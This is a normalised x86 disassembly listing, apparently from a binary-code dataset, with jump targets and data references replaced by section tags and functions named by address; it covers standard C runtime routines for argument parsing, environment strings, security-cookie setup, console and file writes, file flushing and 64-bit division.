mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_200dff7
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_200a391
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_200816a
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_200ba63
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_2003720
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_2003720
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_200368f
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_200ba63
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_200368f
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_200d97b
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_2006ac1
add esp 0x14
sub_200a46f
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_200dff7
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_200dff7
pop ecx
test eax eax
je r-xdata
call sub_200dff7
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_200a609
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_200816a
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_200a46f
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_200ba1e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_200a46f
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_200a6c4
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_200ba1e
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_200ba1e
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_2003ed0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_200368f
pop ecx
mov [ ebp - 0x4 ] ebx
sub_200a7fb
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_200a821
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_200a847
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_200a8dd
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_200e210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_2005634
mov [ eax ] esi
call sub_2005621
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_2003680
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_2005634
xor esi esi
mov [ eax ] esi
call sub_2005621
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_200db33
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_200ca14
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_2008774
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_2005621
mov [ eax ] 0x1c
call sub_2005634
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_2005647
pop ecx
jmp r-xdata
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_200da68
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_200e00f
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_200e1eb
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_200e1eb
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_200e00f
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_200b010
push 0x10
push r--data
call sub_2006310
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_2005634
and [ eax ] 0x0
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
mov [ eax ] edi
call sub_2005621
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_2006be9
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_2006355
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_200cd30
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_2005621
mov [ eax ] 0x9
call sub_2005634
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200a8dd
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200b0e2
mov eax [ ebp - 0x1c ]
sub_200b0ec
push 0x10
push r--data
call sub_2006310
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_2005621
mov [ eax ] 0x9
call sub_2005621
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2006be9
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_2006355
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_200cd30
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_2005621
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_200ccb9
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200b1c3
mov eax [ ebp - 0x1c ]
call sub_2005634
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_200b1d0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_200b280
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_200b340
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_200b3a8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_20076f2
push eax
call sub_200db33
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_20064fc
add eax 0x20
cmp esi eax
jne r-xdata
call sub_20064fc
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_200ba1e
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
